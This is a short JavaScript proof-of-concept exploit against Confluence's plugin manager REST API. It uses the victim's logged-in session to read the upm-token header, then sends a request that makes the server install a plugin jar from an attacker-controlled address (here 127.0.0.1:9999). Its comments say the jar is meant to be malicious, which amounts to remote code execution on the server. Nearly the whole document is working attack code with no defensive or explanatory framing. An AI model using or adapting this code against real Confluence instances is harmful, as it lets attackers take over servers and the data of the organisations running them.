// Fetch the upm-token
fetch("/rest/plugins/1.0/", {
	method: "HEAD",
	credentials: "include",
})
	.then((response) => {
		const upmToken = response.headers.get("upm-token");
		if (upmToken) {
			const pluginInstallUrl = `/rest/plugins/1.0/?token=${upmToken}`;

			// Where the plugin will be fetched from
			// Also possible to upload the jar directly as bytes via this body, for a PoC this is easier
			// The jar must be a Confluence plugin and can't be just any simple malicious jar
			const postBody = JSON.stringify({
				pluginUri: "http://127.0.0.1:9999/plugin.jar",
			});

			// Trigger the plugin installation
			fetch(pluginInstallUrl, {
				method: "POST",
				headers: {
					Accept: "application/json",
					"Content-Type":
						"application/vnd.atl.plugins.install.uri+json",
				},
				credentials: "include",
				body: postBody,
			})
				.then((response) => {
					if (!response.ok)
						throw new Error(
							"invalid response from /rest/plugins/1.0/"
						);
				})
				.catch((error) => console.error(error));
		} else {
			console.error("No upm-token header found");
		}
	})
	.catch((error) => console.error(error));
